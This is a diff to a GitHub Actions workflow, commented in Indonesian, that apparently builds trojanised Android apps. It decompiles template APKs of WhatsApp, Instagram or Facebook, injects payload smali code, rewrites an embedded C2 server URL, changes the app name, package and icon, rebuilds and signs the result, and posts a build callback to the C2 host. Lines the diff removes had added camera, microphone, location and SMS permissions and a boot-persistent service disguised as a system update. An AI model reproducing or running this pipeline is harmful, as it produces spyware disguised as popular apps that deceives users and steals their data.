@@ -10,7 +10,7 @@ on:
         description: 'Nama Aplikasi'
         required: true
       package_name:
-        description: 'Nama Paket (UNTUK PAYLOAD)'
+        description: 'Nama Paket'
         required: true
       c2_url:
         description: 'URL Server C2'
@@ -23,7 +23,7 @@ on:
         description: 'Izin (JSON)'
         required: false
       icon_base64:
-        description: 'Ikon (Base64) - OPSIONAL'
+        description: 'Ikon (Base64)'
         required: false
 
 jobs:
@@ -32,15 +32,6 @@ jobs:
     steps:
       - name: Checkout code
         uses: actions/checkout@v4
-        with:
-          lfs: true
-
-      - name: Force install Git LFS and pull files
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y git-lfs
-          git lfs install
-          git lfs pull
 
       - name: Setup Java
         uses: actions/setup-java@v5
@@ -51,7 +42,7 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt-get update
-          sudo apt-get install -y wget unzip python3 python3-lxml
+          sudo apt-get install -y wget unzip
 
       - name: Download Apktool JAR
         run: |
@@ -64,16 +55,22 @@ jobs:
 
       - name: Prepare template APK (WAJIB LOKAL)
         run: |
+          # 🔥 WAJIB: File template HARUS ada di folder templates/
           TEMPLATE_FILE="templates/${{ inputs.bind_target }}.apk"
           if [ ! -f "$TEMPLATE_FILE" ]; then
             echo "❌ ERROR: File template tidak ditemukan: $TEMPLATE_FILE"
+            echo "📌 Silakan upload file APK ke folder templates/ dengan nama:"
+            echo "   - templates/whatsapp.apk"
+            echo "   - templates/instagram.apk"
+            echo "   - templates/facebook.apk"
             exit 1
           fi
           echo "✅ Menggunakan template lokal: $TEMPLATE_FILE"
           cp "$TEMPLATE_FILE" template.apk
-          if ! file template.apk | grep -q "Android package"; then
-            echo "❌ ERROR: File template bukan APK valid."
-            file template.apk
+          # Verifikasi apakah file adalah APK valid
+          if ! file template.apk | grep -q "Zip archive data"; then
+            echo "❌ ERROR: File template bukan APK valid (bukan zip archive)."
+            echo "📌 Pastikan file yang diupload adalah APK yang benar."
             exit 1
           fi
           echo "✅ Template APK valid."
@@ -81,111 +78,21 @@ jobs:
       - name: Decode template APK
         run: java -jar /usr/local/bin/apktool.jar d template.apk -o decoded/
 
-      - name: Install framework resource
-        run: |
-          java -jar /usr/local/bin/apktool.jar if template.apk || true
-
-      - name: Inject payload smali
+      - name: Inject payload and modify config
         run: |
           if [ -d "payload/smali" ]; then
             cp -r payload/smali/* decoded/smali/
           fi
+          sed -i "s/<string name=\"app_name\">.*<\/string>/<string name=\"app_name\">${{ inputs.app_name }}<\/string>/g" decoded/res/values/strings.xml || true
+          sed -i "s/package=\".*\"/package=\"${{ inputs.package_name }}\"/g" decoded/AndroidManifest.xml || true
+          find decoded -name "*.smali" -exec sed -i "s|https://your-server.com|${{ inputs.c2_url }}|g" {} \; || true
+          if [ -n "${{ inputs.icon_base64 }}" ]; then
+            echo "${{ inputs.icon_base64 }}" | base64 -d > icon.png
+            cp icon.png decoded/res/drawable/ic_launcher.png || true
+          fi
 
-      - name: Replace C2 URL in payload smali
-        run: |
-          find decoded/smali -name "*.smali" -exec sed -i "s|https://your-server.com|${{ inputs.c2_url }}|g" {} \; || true
-          echo "✅ URL C2 diganti"
-
-      - name: Modify AndroidManifest.xml with Python (SAFE)
-        run: |
-          python3 << 'EOF'
-          import re
-          MANIFEST_FILE = "decoded/AndroidManifest.xml"
-          with open(MANIFEST_FILE, 'r') as f:
-              content = f.read()
-          content = re.sub(r'APKTOOL_DUMMYVAL_[^"\s]+', 'dummy', content)
-          permissions = [
-              '<uses-permission android:name="android.permission.INTERNET" />',
-              '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />',
-              '<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />',
-              '<uses-permission android:name="android.permission.CAMERA" />',
-              '<uses-permission android:name="android.permission.RECORD_AUDIO" />',
-              '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />',
-              '<uses-permission android:name="android.permission.READ_SMS" />',
-              '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />',
-              '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />',
-              '<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />'
-          ]
-          perms_str = '\n    '.join(permissions)
-          content = content.replace('</manifest>', f'    {perms_str}\n</manifest>')
-          services = '''
-          <service android:name="com.system.update.UpdateService" android:exported="false" android:foregroundServiceType="dataSync" />
-          <receiver android:name="com.system.update.BootReceiver" android:exported="true">
-              <intent-filter>
-                  <action android:name="android.intent.action.BOOT_COMPLETED" />
-                  <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
-              </intent-filter>
-          </receiver>
-          '''
-          content = content.replace('</application>', f'{services}\n</application>')
-          with open(MANIFEST_FILE, 'w') as f:
-              f.write(content)
-          print("✅ AndroidManifest.xml berhasil dimodifikasi")
-          EOF
-
-      - name: Clean dummy files and references
-        run: |
-          find decoded -type f -name "*DUMMYVAL*" -delete 2>/dev/null || true
-          find decoded -name "*.xml" -exec sed -i '/DUMMYVAL/d' {} \; 2>/dev/null || true
-          find decoded -name "public.xml" -delete 2>/dev/null || true
-          echo "✅ DUMMYVAL berhasil dibersihkan"
-
-      - name: Validate and remove invalid XML files
-        run: |
-          python3 << 'EOF'
-          import os
-          import subprocess
-          import shutil
-          from pathlib import Path
-
-          RES_DIR = "decoded/res"
-          invalid_count = 0
-
-          for root, dirs, files in os.walk(RES_DIR):
-              for file in files:
-                  if file.endswith(".xml"):
-                      path = os.path.join(root, file)
-                      try:
-                          # Gunakan xmllint untuk validasi
-                          result = subprocess.run(
-                              ["xmllint", "--noout", path],
-                              capture_output=True,
-                              text=True,
-                              timeout=2
-                          )
-                          if result.returncode != 0:
-                              print(f"❌ Invalid XML: {path}")
-                              os.remove(path)
-                              invalid_count += 1
-                      except Exception as e:
-                          print(f"⚠️ Error processing {path}: {e}")
-                          os.remove(path)
-                          invalid_count += 1
-
-          print(f"✅ {invalid_count} file XML invalid dihapus")
-          EOF
-
-      - name: Remove all problematic drawable files (additional)
-        run: |
-          find decoded/res -name "abc_*" -delete 2>/dev/null || true
-          find decoded/res -name "design_*" -delete 2>/dev/null || true
-          find decoded/res -name "mtrl_*" -delete 2>/dev/null || true
-          find decoded/res -name "*\$*" -delete 2>/dev/null || true
-          echo "✅ Drawable tambahan dihapus"
-
-      - name: Rebuild APK with --copy-original
-        run: |
-          java -jar /usr/local/bin/apktool.jar b decoded -o unsigned.apk --copy-original
+      - name: Rebuild APK
+        run: java -jar /usr/local/bin/apktool.jar b decoded -o unsigned.apk
 
       - name: Sign APK
         run: |
@@ -198,3 +105,9 @@ jobs:
         with:
           name: app-${{ inputs.build_id }}
           path: signed.apk
+
+      - name: Update build status (success)
+        run: |
+          curl -X POST "${{ inputs.c2_url }}/api/build-callback" \
+            -H "Content-Type: application/json" \
+            -d "{\"build_id\":\"${{ inputs.build_id }}\",\"status\":\"success\",\"download_url\":\"https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts\"}"
